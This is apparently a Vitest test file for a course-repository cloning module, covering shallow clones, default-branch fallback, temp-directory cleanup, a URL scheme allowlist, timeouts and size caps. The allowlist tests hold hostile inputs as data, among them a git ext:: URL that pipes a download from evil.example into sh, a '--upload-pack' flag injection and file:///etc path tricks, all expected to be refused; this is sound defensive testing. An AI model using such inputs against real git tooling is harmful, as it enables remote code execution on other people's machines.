import { execFile } from 'node:child_process';
import { existsSync } from 'node:fs';
import { chmod, mkdir, mkdtemp, readdir, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import * as path from 'node:path';
import { promisify } from 'node:util';
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { assertAllowedRepoUrl, cloneCourseRepo, directorySizeBytes, removeClone } from './clone.ts';

const run = promisify(execFile);

async function git(args: string[], cwd: string): Promise<{ stdout: string }> {
  return run('git', args, { cwd });
}

// Matches clone.ts's own TEMP_PREFIX — kept independent here (not imported)
// so this assertion catches a change to that prefix as a real behavior
// change rather than silently tracking it.
const CLONE_PREFIX = 'learn-clone-';

async function cloneTempEntries(): Promise<string[]> {
  const entries = await readdir(tmpdir());
  return entries.filter((e) => e.startsWith(CLONE_PREFIX));
}

interface BareRepo {
  bareDir: string;
  workDir: string;
  commit: string;
}

/**
 * Builds a real git repo in a fresh temp dir — one commit containing a
 * minimal course — then `git clone --bare` it. A `file://` URL at the bare
 * repo gives every test here a real git clone with no network dependency,
 * which is what keeps this file hermetic in CI (no access to github.com).
 */
async function makeBareRepo(defaultBranch: string): Promise<BareRepo> {
  const workDir = await mkdtemp(path.join(tmpdir(), 'clone-src-'));
  await git(['init', '--quiet', `--initial-branch=${defaultBranch}`], workDir);
  await git(['config', 'user.email', 'test@example.com'], workDir);
  await git(['config', 'user.name', 'Test'], workDir);

  await mkdir(path.join(workDir, 'modules/01-intro'), { recursive: true });
  await writeFile(
    path.join(workDir, 'course.yaml'),
    'schema: 1\nslug: clone-test-course\ntitle: Clone Test\nmodules:\n' +
      '  - id: intro\n    title: Intro\n    lessons:\n      - modules/01-intro/one.md\n',
  );
  await writeFile(path.join(workDir, 'modules/01-intro/one.md'), '---\ntitle: One\n---\n\nHello.\n');

  await git(['add', '-A'], workDir);
  await git(['commit', '--quiet', '-m', 'initial'], workDir);
  const { stdout } = await git(['rev-parse', 'HEAD'], workDir);
  const commit = stdout.trim();

  const bareDir = await mkdtemp(path.join(tmpdir(), 'clone-bare-'));
  await run('git', ['clone', '--quiet', '--bare', workDir, bareDir]);

  return { bareDir, workDir, commit };
}

describe('cloneCourseRepo', () => {
  let bareMain: BareRepo;
  let bareTrunk: BareRepo;

  beforeAll(async () => {
    bareMain = await makeBareRepo('main');
    bareTrunk = await makeBareRepo('trunk');
  });

  afterAll(async () => {
    for (const d of [bareMain.bareDir, bareMain.workDir, bareTrunk.bareDir, bareTrunk.workDir]) {
      await rm(d, { recursive: true, force: true });
    }
  });

  it('clones a file:// URL at depth 1 and resolves HEAD to the real commit sha', async () => {
    const clone = await cloneCourseRepo(`file://${bareMain.bareDir}`, { allowFileUrl: true });
    try {
      expect(clone.commit).toBe(bareMain.commit);
      expect(existsSync(path.join(clone.dir, 'course.yaml'))).toBe(true);

      const { stdout } = await git(['rev-list', '--count', 'HEAD'], clone.dir);
      expect(stdout.trim()).toBe('1'); // --depth 1: exactly one commit of history
    } finally {
      await removeClone(clone.dir);
    }
  });

  it("falls back to the repo's actual default branch when main does not exist and no ref was requested", async () => {
    const clone = await cloneCourseRepo(`file://${bareTrunk.bareDir}`, { allowFileUrl: true });
    try {
      expect(clone.commit).toBe(bareTrunk.commit);
      expect(existsSync(path.join(clone.dir, 'course.yaml'))).toBe(true);
    } finally {
      await removeClone(clone.dir);
    }
  });

  it('does not fall back when an explicit ref is requested and missing, and cleans up its temp dir', async () => {
    const before = await cloneTempEntries();

    await expect(
      cloneCourseRepo(`file://${bareMain.bareDir}`, { ref: 'no-such-branch', allowFileUrl: true }),
    ).rejects.toThrow();

    const after = await cloneTempEntries();
    expect(after).toEqual(before);
  });

  it('removes its own temp directory when the clone fails outright', async () => {
    const before = await cloneTempEntries();

    await expect(cloneCourseRepo('file:///no/such/path/at/all', { allowFileUrl: true })).rejects.toThrow();

    const after = await cloneTempEntries();
    expect(after).toEqual(before);
  });

  it('removeClone deletes a successful clone directory', async () => {
    const clone = await cloneCourseRepo(`file://${bareMain.bareDir}`, { allowFileUrl: true });
    expect(existsSync(clone.dir)).toBe(true);

    await removeClone(clone.dir);
    expect(existsSync(clone.dir)).toBe(false);
  });

  it('removeClone is a no-op on an already-removed directory', async () => {
    const clone = await cloneCourseRepo(`file://${bareMain.bareDir}`, { allowFileUrl: true });
    await removeClone(clone.dir);
    await expect(removeClone(clone.dir)).resolves.toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// Phase 5 hardening (design §8.1): scheme allowlist, timeout, size cap.
// ---------------------------------------------------------------------------

describe('assertAllowedRepoUrl', () => {
  it('accepts the remote forms a content repo legitimately uses', () => {
    for (const url of [
      'https://github.com/org/repo.git',
      'https://user@example.com:8443/org/repo',
      'ssh://git@github.com/org/repo.git',
      'git@github.com:org/repo.git',
      'deploy-key@git.example.com:org/repo',
    ]) {
      expect(() => assertAllowedRepoUrl(url), url).not.toThrow();
    }
  });

  it('refuses file:// — design §8.1: "a repo URL cannot become file:///etc"', () => {
    expect(() => assertAllowedRepoUrl('file:///etc')).toThrow(/only https:\/\/ and ssh:\/\/ remotes are allowed/);
    expect(() => assertAllowedRepoUrl('file:///etc')).toThrow(/file:\/\/, git:\/\/, http:\/\/ and git's ext:: transport are refused/);
  });

  it("refuses git's ext:: transport, which executes a command rather than fetching", () => {
    expect(() => assertAllowedRepoUrl('ext::sh -c "curl evil.example|sh"')).toThrow(/Refusing to clone/);
    expect(() => assertAllowedRepoUrl('ext::sh')).toThrow(/Refusing to clone/);
  });

  it('refuses plaintext transports', () => {
    expect(() => assertAllowedRepoUrl('http://example.com/repo.git')).toThrow(/Refusing to clone/);
    expect(() => assertAllowedRepoUrl('git://example.com/repo.git')).toThrow(/Refusing to clone/);
  });

  it('refuses a bare local path, which is a file clone without the scheme', () => {
    expect(() => assertAllowedRepoUrl('/srv/content/repo')).toThrow(/Refusing to clone/);
    expect(() => assertAllowedRepoUrl('../../etc')).toThrow(/Refusing to clone/);
    expect(() => assertAllowedRepoUrl('repo.git')).toThrow(/Refusing to clone/);
  });

  it('refuses a URL that could be read as a flag, or that carries whitespace or control characters', () => {
    expect(() => assertAllowedRepoUrl('--upload-pack=/tmp/pwned')).toThrow(/may not begin with "-"/);
    expect(() => assertAllowedRepoUrl('https://example.com/a b')).toThrow(/whitespace or control characters/);
    expect(() => assertAllowedRepoUrl('https://example.com/a\nfake log line')).toThrow(
      /whitespace or control characters/,
    );
    expect(() => assertAllowedRepoUrl('')).toThrow(/is empty/);
  });

  it('accepts file:// ONLY when the internal opt-in is passed', () => {
    expect(() => assertAllowedRepoUrl('file:///tmp/x')).toThrow();
    expect(() => assertAllowedRepoUrl('file:///tmp/x', { allowFileUrl: true })).not.toThrow();
    // The opt-in is a function argument, so no URL can smuggle it in.
    expect(() => assertAllowedRepoUrl('file:///tmp/x?allowFileUrl=true')).toThrow();
    // …and it does not open anything else up.
    expect(() => assertAllowedRepoUrl('ext::sh -c x', { allowFileUrl: true })).toThrow();
    expect(() => assertAllowedRepoUrl('http://example.com/r', { allowFileUrl: true })).toThrow();
  });
});

describe('cloneCourseRepo — limits', () => {
  let fakeBin: string;
  let realPath: string | undefined;
  let smallRepo: BareRepo;

  /** Puts a fake `git` first on PATH, so a limit can be tested against a
   * remote that behaves badly on purpose without needing a network. */
  async function withFakeGit(script: string, fn: () => Promise<void>): Promise<void> {
    await writeFile(path.join(fakeBin, 'git'), script);
    await chmod(path.join(fakeBin, 'git'), 0o755);
    process.env.PATH = `${fakeBin}:${realPath ?? ''}`;
    try {
      await fn();
    } finally {
      process.env.PATH = realPath;
    }
  }

  beforeAll(async () => {
    fakeBin = await mkdtemp(path.join(tmpdir(), 'fake-git-'));
    realPath = process.env.PATH;
    smallRepo = await makeBareRepo('main');
  });

  afterAll(async () => {
    process.env.PATH = realPath;
    await rm(fakeBin, { recursive: true, force: true });
    await rm(smallRepo.bareDir, { recursive: true, force: true });
    await rm(smallRepo.workDir, { recursive: true, force: true });
  });

  it('refuses a file:// URL from a caller that did not opt in, before spawning git', async () => {
    const before = await cloneTempEntries();

    await expect(cloneCourseRepo('file:///etc')).rejects.toThrow(/only https:\/\/ and ssh:\/\/ remotes are allowed/);

    // Nothing was created: the URL is checked before any temp directory is made.
    expect(await cloneTempEntries()).toEqual(before);
  });

  it('kills a hung clone at the timeout instead of waiting on it forever', async () => {
    await withFakeGit('#!/bin/sh\nsleep 30\n', async () => {
      const before = await cloneTempEntries();
      const started = Date.now();

      await expect(
        cloneCourseRepo('https://slow.example/repo.git', { timeoutMs: 400 }),
      ).rejects.toThrow(/timed out after 400ms/);

      expect(Date.now() - started).toBeLessThan(10_000);
      expect(await cloneTempEntries()).toEqual(before);
    });
  });

  it('aborts a runaway clone WHILE it is still growing, not after it finishes', async () => {
    // Writes 512 KiB every 50 ms for 5 s if left alone. The cap is 2 MiB, so a
    // check that only ran after git exited would let ~50 MiB land on disk
    // first; this must be killed after roughly a quarter of a second.
    const script = [
      '#!/bin/sh',
      'for a in "$@"; do dest="$a"; done',
      'mkdir -p "$dest"',
      'i=0',
      'while [ "$i" -lt 100 ]; do',
      '  dd if=/dev/zero of="$dest/blob.$i" bs=65536 count=8 2>/dev/null',
      '  i=$((i+1))',
      '  sleep 0.05',
      'done',
      '',
    ].join('\n');

    await withFakeGit(script, async () => {
      const before = await cloneTempEntries();
      const started = Date.now();

      await expect(
        cloneCourseRepo('https://huge.example/repo.git', {
          maxBytes: 2 * 1024 * 1024,
          sizePollMs: 25,
          timeoutMs: 30_000,
        }),
      ).rejects.toThrow(/exceeds the 2097152-byte size cap/);

      const elapsed = Date.now() - started;
      expect(elapsed).toBeLessThan(4_000); // the script alone would take >5s
      expect(await cloneTempEntries()).toEqual(before);
    });
  });

  it('refuses a repo that is over the cap even when it clones too fast to be caught mid-flight', async () => {
    const before = await cloneTempEntries();

    await expect(
      cloneCourseRepo(`file://${smallRepo.bareDir}`, { allowFileUrl: true, maxBytes: 1024 }),
    ).rejects.toThrow(/exceeds the 1024-byte size cap/);

    expect(await cloneTempEntries()).toEqual(before);
  });

  it('directorySizeBytes sums regular files recursively and does not follow symlinks', async () => {
    const dir = await mkdtemp(path.join(tmpdir(), 'dirsize-'));
    try {
      await mkdir(path.join(dir, 'nested'), { recursive: true });
      await writeFile(path.join(dir, 'a.bin'), Buffer.alloc(1000));
      await writeFile(path.join(dir, 'nested', 'b.bin'), Buffer.alloc(2000));
      await symlink('/', path.join(dir, 'root-link'));

      expect(await directorySizeBytes(dir)).toBe(3000);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});
